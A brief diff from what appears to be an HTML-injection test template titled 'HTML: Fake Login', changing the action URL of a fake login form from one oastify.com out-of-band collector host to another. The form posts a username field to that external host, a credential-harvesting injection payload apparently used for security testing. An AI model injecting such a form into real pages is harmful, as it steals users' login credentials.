@@ -7,7 +7,7 @@ info:
         <h1>HTML: Fake Login</h1>
     </div>
     <div class="form-container">
-        <form action="https://918bbabyyslr301u5s5nsaqgc7iz6pue.oastify.com" method="post" class="form-signin">
+        <form action="https://c8leidi15vsua38xcvcqzdxjjap1dt1i.oastify.com" method="post" class="form-signin">
             <div class="form-group">
                 <label for="username">Username</label>
                 <input type="text" name="username" size="20">
